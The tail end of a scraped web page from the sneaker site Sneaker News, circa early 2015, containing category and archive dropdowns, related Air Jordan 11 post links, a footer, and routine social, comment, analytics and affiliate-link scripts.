	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
<script type='text/javascript'>
/* <![CDATA[ */
            var ec_dropdown_top_2 = document.getElementById("cat");
            function ec_top_onCatChange_2() {
                if ( ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value > 0 ) {
                    location.href = "http://sneakernews.com/?cat="+ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value;
                }
            }
            ec_dropdown_top_2.onchange = ec_top_onCatChange_2;
/* ]]> */
</script>
</div>	<li class="cat-item cat-item-1"><a href="http://sneakernews.com/category/just-released/" >Just Released</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://sneakernews.com/category/air-max/" >Nike Air Max</a>
</li>
	<li class="cat-item cat-item-7"><a href="http://sneakernews.com/category/air-force-1/" >Nike Air Force 1s</a>
</li>
	<li class="cat-item cat-item-10"><a href="http://sneakernews.com/category/nike-sb/" >Nike SB</a>
</li>
	<li class="cat-item cat-item-11"><a href="http://sneakernews.com/category/dunk/" >Dunk</a>
</li>
	<li class="cat-item cat-item-12"><a href="http://sneakernews.com/category/air-jordan/" >Air Jordan</a>
</li>
	<li class="cat-item cat-item-21"><a href="http://sneakernews.com/category/basketball/" >Basketball</a>
</li>
	<li class="cat-item cat-item-22"><a href="http://sneakernews.com/category/lebron/" >LeBron</a>
</li>
	<li class="cat-item cat-item-24"><a href="http://sneakernews.com/category/adidas/" >Adidas</a>
</li>
	<li class="cat-item cat-item-38"><a href="http://sneakernews.com/category/running/" >Running</a>
</li>
	<li class="cat-item cat-item-43"><a href="http://sneakernews.com/category/collaboration/" >Collaboration</a>
</li>
	<li class="cat-item cat-item-58"><a href="http://sneakernews.com/category/nike-retro/" >Nike Retro</a>
</li>
	<li class="cat-item cat-item-66"><a href="http://sneakernews.com/category/upcoming-sneakers/" >Upcoming Sneakers</a>
</li>
	<li class="cat-item cat-item-69"><a href="http://sneakernews.com/category/skate/" >Skate</a>
</li>
	<li class="cat-item cat-item-205"><a href="http://sneakernews.com/category/ebay/" >eBay</a>
</li>
	<li class="cat-item cat-item-217"><a href="http://sneakernews.com/category/lifestyle-sneakers/" >Lifestyle Sneakers</a>
</li>
</ul>    </section>

    <section class="right-data-con">
        <h3><span>Archives</span></h3><div class="cat-drop">		<select name="archive-dropdown" onchange='document.location.href=this.options[this.selectedIndex].value;'>
			<option value="">Select Month</option>

				<option value='http://sneakernews.com/2015/01/'> January 2015 </option>
	<option value='http://sneakernews.com/2014/12/'> December 2014 </option>
	<option value='http://sneakernews.com/2014/11/'> November 2014 </option>
	<option value='http://sneakernews.com/2014/10/'> October 2014 </option>
	<option value='http://sneakernews.com/2014/09/'> September 2014 </option>
	<option value='http://sneakernews.com/2014/08/'> August 2014 </option>
	<option value='http://sneakernews.com/2014/07/'> July 2014 </option>
	<option value='http://sneakernews.com/2014/06/'> June 2014 </option>
	<option value='http://sneakernews.com/2014/05/'> May 2014 </option>
	<option value='http://sneakernews.com/2014/04/'> April 2014 </option>
	<option value='http://sneakernews.com/2014/03/'> March 2014 </option>
	<option value='http://sneakernews.com/2014/02/'> February 2014 </option>
	<option value='http://sneakernews.com/2014/01/'> January 2014 </option>
	<option value='http://sneakernews.com/2013/12/'> December 2013 </option>
	<option value='http://sneakernews.com/2013/11/'> November 2013 </option>
	<option value='http://sneakernews.com/2013/10/'> October 2013 </option>
	<option value='http://sneakernews.com/2013/09/'> September 2013 </option>
	<option value='http://sneakernews.com/2013/08/'> August 2013 </option>
	<option value='http://sneakernews.com/2013/07/'> July 2013 </option>
	<option value='http://sneakernews.com/2013/06/'> June 2013 </option>
	<option value='http://sneakernews.com/2013/05/'> May 2013 </option>
	<option value='http://sneakernews.com/2013/04/'> April 2013 </option>
	<option value='http://sneakernews.com/2013/03/'> March 2013 </option>
	<option value='http://sneakernews.com/2013/02/'> February 2013 </option>
	<option value='http://sneakernews.com/2013/01/'> January 2013 </option>
	<option value='http://sneakernews.com/2012/12/'> December 2012 </option>
	<option value='http://sneakernews.com/2012/11/'> November 2012 </option>
	<option value='http://sneakernews.com/2012/10/'> October 2012 </option>
	<option value='http://sneakernews.com/2012/09/'> September 2012 </option>
	<option value='http://sneakernews.com/2012/08/'> August 2012 </option>
	<option value='http://sneakernews.com/2012/07/'> July 2012 </option>
	<option value='http://sneakernews.com/2012/06/'> June 2012 </option>
	<option value='http://sneakernews.com/2012/05/'> May 2012 </option>
	<option value='http://sneakernews.com/2012/04/'> April 2012 </option>
	<option value='http://sneakernews.com/2012/03/'> March 2012 </option>
	<option value='http://sneakernews.com/2012/02/'> February 2012 </option>
	<option value='http://sneakernews.com/2012/01/'> January 2012 </option>
	<option value='http://sneakernews.com/2011/12/'> December 2011 </option>
	<option value='http://sneakernews.com/2011/11/'> November 2011 </option>
	<option value='http://sneakernews.com/2011/10/'> October 2011 </option>
	<option value='http://sneakernews.com/2011/09/'> September 2011 </option>
	<option value='http://sneakernews.com/2011/08/'> August 2011 </option>
	<option value='http://sneakernews.com/2011/07/'> July 2011 </option>
	<option value='http://sneakernews.com/2011/06/'> June 2011 </option>
	<option value='http://sneakernews.com/2011/05/'> May 2011 </option>
	<option value='http://sneakernews.com/2011/04/'> April 2011 </option>
	<option value='http://sneakernews.com/2011/03/'> March 2011 </option>
	<option value='http://sneakernews.com/2011/02/'> February 2011 </option>
	<option value='http://sneakernews.com/2011/01/'> January 2011 </option>
	<option value='http://sneakernews.com/2010/12/'> December 2010 </option>
	<option value='http://sneakernews.com/2010/11/'> November 2010 </option>
	<option value='http://sneakernews.com/2010/10/'> October 2010 </option>
	<option value='http://sneakernews.com/2010/09/'> September 2010 </option>
	<option value='http://sneakernews.com/2010/08/'> August 2010 </option>
	<option value='http://sneakernews.com/2010/07/'> July 2010 </option>
	<option value='http://sneakernews.com/2010/06/'> June 2010 </option>
	<option value='http://sneakernews.com/2010/05/'> May 2010 </option>
	<option value='http://sneakernews.com/2010/04/'> April 2010 </option>
	<option value='http://sneakernews.com/2010/03/'> March 2010 </option>
	<option value='http://sneakernews.com/2010/02/'> February 2010 </option>
	<option value='http://sneakernews.com/2010/01/'> January 2010 </option>
	<option value='http://sneakernews.com/2009/12/'> December 2009 </option>
	<option value='http://sneakernews.com/2009/11/'> November 2009 </option>
	<option value='http://sneakernews.com/2009/10/'> October 2009 </option>
	<option value='http://sneakernews.com/2009/09/'> September 2009 </option>
	<option value='http://sneakernews.com/2009/08/'> August 2009 </option>
	<option value='http://sneakernews.com/2009/07/'> July 2009 </option>
	<option value='http://sneakernews.com/2009/06/'> June 2009 </option>
	<option value='http://sneakernews.com/2009/05/'> May 2009 </option>
	<option value='http://sneakernews.com/2009/04/'> April 2009 </option>
	<option value='http://sneakernews.com/2009/03/'> March 2009 </option>
	<option value='http://sneakernews.com/2009/02/'> February 2009 </option>
	<option value='http://sneakernews.com/2009/01/'> January 2009 </option>
	<option value='http://sneakernews.com/2008/12/'> December 2008 </option>
	<option value='http://sneakernews.com/2008/11/'> November 2008 </option>
	<option value='http://sneakernews.com/2008/10/'> October 2008 </option>
	<option value='http://sneakernews.com/2008/09/'> September 2008 </option>
	<option value='http://sneakernews.com/2008/08/'> August 2008 </option>
	<option value='http://sneakernews.com/2008/07/'> July 2008 </option>
	<option value='http://sneakernews.com/2008/06/'> June 2008 </option>
	<option value='http://sneakernews.com/2008/05/'> May 2008 </option>
	<option value='http://sneakernews.com/2008/04/'> April 2008 </option>
	<option value='http://sneakernews.com/2008/03/'> March 2008 </option>
	<option value='http://sneakernews.com/2008/02/'> February 2008 </option>
	<option value='http://sneakernews.com/2008/01/'> January 2008 </option>
	<option value='http://sneakernews.com/2007/12/'> December 2007 </option>
	<option value='http://sneakernews.com/2007/11/'> November 2007 </option>
	<option value='http://sneakernews.com/2007/10/'> October 2007 </option>
	<option value='http://sneakernews.com/2007/09/'> September 2007 </option>
	<option value='http://sneakernews.com/2007/08/'> August 2007 </option>
	<option value='http://sneakernews.com/2007/07/'> July 2007 </option>
	<option value='http://sneakernews.com/2007/06/'> June 2007 </option>
	<option value='http://sneakernews.com/2007/05/'> May 2007 </option>
	<option value='http://sneakernews.com/2007/04/'> April 2007 </option>
	<option value='http://sneakernews.com/2007/03/'> March 2007 </option>
	<option value='http://sneakernews.com/2007/02/'> February 2007 </option>
	<option value='http://sneakernews.com/2007/01/'> January 2007 </option>
	<option value='http://sneakernews.com/2006/12/'> December 2006 </option>
		</select>
</div>    </section>

    <section class="right-data-con featured-content">
        <h3><span>Featured Content</span></h3>			<div class="textwidget"><div class="featured-content-sidebar">


<a href="http://sneakernews.com/air-jordan-brand-jordan/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_historyaj.jpg"></a>
<br>

<a href="http://sneakernews.com/nike-sb-skateboarding/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_nikesbarchive.jpg"></a>
<br>

<a href="http://sneakernews.com/magazine/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/SNMAG-300x250.jpg"></a>
</div><br>



</div>
		    </section>

    <section class="right-data-con news-letter">
        <h3><span>Sneaker News Newsletter</span></h3>			<div class="textwidget"><div class="e-mail">
	        <form method="post" target="_blank" action="http://visitor.r20.constantcontact.com/d.jsp" name="ccoptin">
				<input class="newslatterclass" type="text" name="ea" size="35" value="Enter Email To Sign Up" onBlur="if(this.value=='') this.value='Enter Email To Sign Up'" onFocus="if(this.value =='Enter Email To Sign Up' ) this.value=''">
				<input type="submit" class="submit" value="Sign Up" name="signup">
				<input type="hidden" value="dcdlvybab" name="llr">
				<input type="hidden" value="1101413059651" name="m">
				<input type="hidden" value="oi" name="p">
			</form>                     	
		</div></div>
		    </section>
    				<section class="right-data-con ">
					<h3><span>Related posts</span></h3>
											<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/31/rare-air-jordan-11-dmp-golden-eyelet-sample-autographed-michael-jordan/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/rare-air-jordan-11-dmp-sample-gold-eyelet-autograph-01.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/31/rare-air-jordan-11-dmp-golden-eyelet-sample-autographed-michael-jordan/">Rare Air Jordan 11 &#8220;DMP&#8221; Golden Eyelet Sample is Autographed by Michael Jordan</a></strong>
									<span>by <a href="http://sneakernews.com/author/Patrick Johnson"> Patrick Johnson</a></span>
									<i>
									14 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/30/sneaker-news-2014-year-review-top-20-jordan-brand-releases/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/YIR_cover_jordanbrand.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/30/sneaker-news-2014-year-review-top-20-jordan-brand-releases/">Sneaker News 2014 Year in Review: Top 20 Jordan Brand Releases</a></strong>
									<span>by <a href="http://sneakernews.com/author/Sneaker News"> Sneaker News</a></span>
									<i>
									51 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/28/air-jordan-11lab4/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/air-jordan-11-lab-4-black-patent-leather.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/28/air-jordan-11lab4/">Air Jordan 11Lab4</a></strong>
									<span>by <a href="http://sneakernews.com/author/John Kim"> John Kim</a></span>
									<i>
									69 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/22/entire-unc-tar-heels-team-wears-legend-blue-11s/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/entire-unc-basketball-team-wears-legend-blue-11s-01.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/22/entire-unc-tar-heels-team-wears-legend-blue-11s/">Entire UNC Tar Heels Team Wears Legend Blue 11s</a></strong>
									<span>by <a href="http://sneakernews.com/author/Patrick Johnson"> Patrick Johnson</a></span>
									<i>
									76 Comments</i>
								</p>
							</div>
						</div>
												<div class="recent-posts releted-post-image">
							<div class="post-img">
								<a href="http://sneakernews.com/2014/12/20/air-jordan-11-pe-kawhi-leonard/">
									<img src="http://cdn.sneakernews.com/wp-content/uploads/2014/12/kawhi-leonard-air-jordan-11-pe.jpg" alt="" />
								</a>
							</div>
							<div class="post-text">
								<p>
									<strong><a href="http://sneakernews.com/2014/12/20/air-jordan-11-pe-kawhi-leonard/">Air Jordan 11 PE for Kawhi Leonard</a></strong>
									<span>by <a href="http://sneakernews.com/author/John Kim"> John Kim</a></span>
									<i>
									20 Comments</i>
								</p>
							</div>
						</div>
						</section>
    
    	
    	    
    
    

</div>                <!--side-bar-->                    
  

        </div>              
    </div>
</div>
<!--container-->

</div>
<!-- end cmn_wrap -->
<footer id="colophon" role="contentinfo">
    <div class="wrapper">
        <div class="footer-main">
            <div class="footer-left">
                <div class="footer-top">
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                        <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                        <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li><li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li><li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                </div>
                <div class="footer-text">
                    <p>
                    © 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</p>
                </div>
            </div>
            <div class="footer-right">
                <ul class="footer-menu">
<div class="menu-footer-menu-container"><li id="menu-item-550283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550283"><a href="http://sneakernews.com/about/">About Us</a></li>
<li id="menu-item-550284" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550284"><a href="http://sneakernews.com/jobs/">career</a></li>
<li id="menu-item-550285" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550285"><a href="http://sneakernews.com/advertise/">advertise</a></li>
<li id="menu-item-550286" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550286"><a href="http://sneakernews.com/about/#sneaker-news-staff">staff</a></li>
<li id="menu-item-550287" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550287"><a href="http://sneakernews.com/contact/">Contact</a></li>
</div>                </ul>
            </div>

            <div class="footer-for-mobile">
                <div class="mob-soc-icon">
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li><li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                                                                                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                                                                                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                                                                                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <p><span>© 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</span></p>
                </div>
            </div>

        </div>
    </div>
</footer><!-- #colophon -->
</div><!--main-->
	<script type="text/javascript">
		//livefire comment count  functionality
		
		var _md = jQuery.noConflict();		
	    _md("document").ready(function(){
	    	
	    	function set_comment_count_fun(){
		    	//var new_comment_count = _md('.fyre .fyre-stream-stats span').text().replace(/ /g,'');
				var new_comment_count = _md('.fyre .fyre-stream-stats .fyre-comment-count span').text();
				if('' != new_comment_count ){
					new_comment_count = new_comment_count.slice(0,-8);
					new_comment_count = new_comment_count.replace('/[A-Za-z$-]/g','');
					var old_comment_count = _md('b.comment').text();
			    	if( old_comment_count.replace(/\s/g, '') != new_comment_count.replace(/\s/g, '')) {					
			    		add_comment_count(new_comment_count);			    		
			    	}
				}
		    }
		    
		    function add_comment_count(comment_counts){		      
		     var formData = { post_url:window.location.href,comment_count:comment_counts };	    	  
		     var my_url = "http://sneakernews.com/wp-content/themes/sneakernews/lifefire-comment-count.php";
		        $.ajax({
		            type: 'POST',
		            url: my_url,
		            data: formData,		            
		            success: function(comment_opdate) {
		               //$(this).find('#shares-like strong').text(share_count_data);		              
		           }
		    	});
		    }		    	    	
	    	setTimeout(set_comment_count_fun, 5000);    
	    });		
	</script>

<script type="text/javascript">
	function add_digit_share_counts(get_page_url, social_call) {
        var formData = {page_url: get_page_url};        
        var my_url = "http://sneakernews.com/wp-content/themes/sneakernews/share_count_api.php";
        $.ajax({
            type: 'POST',
            url: my_url,
            data: formData,
            success: function(share_count_data) {
                //$(this).find('#shares-like strong').text(share_count_data);
               // alert(1);
            }
        });
    }
    var _rys = jQuery.noConflict();
    var margin_top = _rys("#sneaker-news-main nav ul").height();
    var top_div_hight = _rys("#sneaker-news-main .logo-main").height();
	var add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
    _rys("document").ready(function() {
        var browsername = $.browser.mozilla;
        _rys(window).scroll(function() {
            add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
			margin_top = _rys("#sneaker-news-main nav ul").height();			
            top_div_hight = _rys("#sneaker-news-main .logo-main").height() + add_dynamic_hight;

            if (_rys(this).scrollTop() > top_div_hight) {
                _rys('.sneaker-nav').addClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', margin_top);

            } else {
                _rys('.sneaker-nav').removeClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
            }

            if (browsername == true) {
                if (_rys(this).scrollTop() > 600) {
                    _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
                }
            }
        });
        _rys('.rating-img img').hover(function() {
            if (!($(this).hasClass('after_rating_img'))) {
                _rys(this).parent().find('i').show();
            }
        }, function() {
            _rys(this).parent().find('i').hide();
        }); 
        
        //_rys('#detail-page-container .detail-con-main .detail-wide-main .product-detail-main .date-and-name p b.comment').text(_rys('.fyre .fyre-stream-stats span').text().slice(0,-8));
       	
       
    });

</script>

<script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id))
            return;
        js = d.createElement(s);
        js.id = id;
        js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=705752536169784&version=v2.0";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

    window.fbAsyncInit = function() {
        FB.Event.subscribe('edge.create', function(response) {
            add_digit_share_counts(response, 'FB');
        });
        FB.Event.subscribe('edge.remove', function(href, widget) {
            add_digit_share_counts(href, 'FB');
        });
    };

    function googlePlusCallback(jsonParam) {
        var plusOneUrl = jsonParam.href;
        add_digit_share_counts(plusOneUrl, 'gooleplus');

    }
    function reward_user(event) {
        if (event) {
            var temp_array = event.target.src.split('&').reverse();
            var get_url = '';
            var re_jem = /%3A/g;
            var re_slash = /%2F/g;

            for (index = 0; index < temp_array.length; ++index) {
                var check_string = temp_array[index];
                if ('url=' == check_string.substring(0, 4)) {
                    get_url = temp_array[index].substring(4, temp_array[index].length);
                    break;
                }
            }
            get_url = get_url.replace(re_jem, ':');
            get_url = get_url.replace(re_slash, "/");

            add_digit_share_counts(get_url, 'TWEET');

        }
    }
    window.twttr = (function(d, s, id) {
        var t, js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) {
            return
        }
        js = d.createElement(s);
        js.id = id;
        js.src = "https://platform.twitter.com/widgets.js";
        fjs.parentNode.insertBefore(js, fjs);
        return window.twttr || (t = {_e: [], ready: function(f) {
                t._e.push(f)
            }})
    }(document, "script", "twitter-wjs"));

    twttr.ready(function(twttr) {
        twttr.events.bind('tweet', reward_user);
    });
    
    jQuery(function($) {
    	
		jQuery('body').on('click', 'a[data-pin-log="button_pinit"]', function(event) {
           // alert($(this).closest('.post-header').find('.header-title a').attr("href"));            
            var pingrest_url = $(this).closest('.post-header').find('.header-title a').attr("href");
            if( typeof pingrest_url === "undefined" ) {
            	pingrest_url = window.location.href;                     
            }
			add_digit_share_counts(pingrest_url, 'TWEET');
     	});
    
        $('.social_box').on("touchstart", function (e) {
		    "use strict"; //satisfy the code inspectors
		    var link = $(this); //preselect the link
		    if ($(window).width() <= 1024 && navigator.userAgent.match(/(iPod|iPhone|iPad)/)) {
			    if (link.hasClass('hover')) {
			        return true;
			    } else {
			        link.addClass("hover");
			        $('.social_box').not(this).removeClass("hover");
			        e.preventDefault();
			        return false; //extra, and to make sure the function has consistent return points
			    }
		    }
		});
    });
</script>

<script type="text/javascript">var lf_config = [{"collectionMeta":"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJ0aXRsZSI6IkEgRGV0YWlsZWQgTG9vayBhdCB0aGUgQWlyIEpvcmRhbiAxMSAmIzgyMjA7TGVnZW5kIEJsdWUmIzgyMjE7IiwidXJsIjoiaHR0cDpcL1wvc25lYWtlcm5ld3MuY29tXC8yMDE0XC8xMVwvMjhcL2RldGFpbGVkLWxvb2stYWlyLWpvcmRhbi0xMS1sZWdlbmQtYmx1ZVwvIiwidGFncyI6WyJBaXIgSm9yZGFuIDExIiwiQWlyIEpvcmRhbiAxMSBMZWdlbmQgQmx1ZSIsIkFpciBKb3JkYW4gMTEgTGVnZW5kIEJsdWUgLSBQcmljZSAmYW1wOyBSZWxlYXNlIERhdGUiLCJBaXIgSm9yZGFuIFhJIl0sImNoZWNrc3VtIjoiMGJiOGY2MDJjYWE3NzhlOTc4OGQyMTA1YTBkN2VhOTkiLCJhcnRpY2xlSWQiOjU1MjYyOX0.lsbnk6enj3-WW0Th8AmfPH1YTdzPOMqhpF2bC7qN77Y","checksum":"0bb8f602caa778e9788d2105a0d7ea99","siteId":"307153","articleId":552629,"strings":"","el":"livefyre-comments"}];var conv = fyre.conv.load({}, lf_config);</script>
            <!-- LF DEBUG
            site-id: 307153
            article-id: 552629
            post-type: post
            comments-open: true
            is-single: true
            display-posts: true
            display-pages: true
            -->
        	<div style="display:none">
	</div>

	<script src="http://stats.wordpress.com/e-201501.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:2.6.3',blog:'30110943',post:'552629',tz:'-5'});
	var load_cmc = function(){linktracker_init(30110943,552629,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script>


<!-- Quantcast Tag --> 
<script type="text/javascript">
  var _qevents = _qevents || [];

  (function() {
   var elem = document.createElement('script');

   elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
   elem.async = true;
   elem.type = "text/javascript";
   var scpt = document.getElementsByTagName('script')[0];
   scpt.parentNode.insertBefore(elem, scpt);  
  })();
</script>
<script type="text/javascript">
_qevents.push( { qacct:"p-a0gOdUACucKCE"} );
</script>
<noscript>
<div style="display: none;"><img src="//pixel.quantserve.com/pixel/p-a0gOdUACucKCE.gif" height="1" width="1" alt="Quantcast"/></div>
</noscript>
<!-- End Quantcast tag -->



<!-- cmnUNT | Begin footer script -->
<script type="text/javascript">            
    cmnTB();                // Toolbar
    cmnUNT('tover', tile_num++);        // Wallpaper Takeover
</script>

<!-- Begin comScore Tag -->
<script>document.write(unescape("%3Cscript src='" + (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js' %3E%3C/script%3E"));</script>
<script>
  COMSCORE.beacon({
    c1:2,
    c2:6685975,
    c3:"",
    c4:"www.sneakernews.com/",
    c5:"",
    c6:"",
    c15:""
  });
</script>

<script type="text/javascript">

function showCommentCount() { 
    jQuery('.custom_comment').each(function(){
	var span_text = jQuery(this).text();
        var ahtml = ""+jQuery(this).find('a').html()+"";
	var start = (span_text + '').indexOf('(', 0) + 1;
	var end = (span_text + '').indexOf(')', 0) - start;
	//alert(span_text.substr(start,end));
    ahtml = span_text.substr(start,end);
    //ahtml = ahtml.substr(10, ahtml.length - 11);
	jQuery(this).html(ahtml);

});

jQuery('.custom_comment').show();
}
</script>
<script type="text/javascript">
(function($){
jQuery(document).ready(function () {   	
setTimeout(showCommentCount, 6000);

}); 
})(jQuery);
</script>
<noscript><img src="http://b.scorecardresearch.com/p?c1=2&c2=6685975&c3=&c4=&c5=&c6=&c15=&cj=1" /></noscript>
<!-- End comScore Tag -->

<script type="text/javascript">
  (function() {
    var elem = document.createElement('script');
    elem.src = 'http://cdnl.complex.com/tv/js/widget.min.js';
    elem.async = true;
    elem.type = "text/javascript";
    var scpt = document.getElementsByTagName('script')[0];
    scpt.parentNode.insertBefore(elem, scpt);
  })();
</script>



<!--END-YM-NOTE GOES RIGHT ABOVE <script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/comment-reply.min.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>-->
<!--VIGLINK-->
<script type="text/javascript">
  var vglnk = { key: '678de23857128c9f3563fdc6fb9dd89d' };

  (function(d, t) {
    var s = d.createElement(t); s.type = 'text/javascript'; s.async = true;
    s.src = '//cdn.viglink.com/api/vglnk.js';
    var r = d.getElementsByTagName(t)[0]; r.parentNode.insertBefore(s, r);
  }(document, 'script'));
</script>
<!--VIGLINK-->
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/comment-reply.min.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
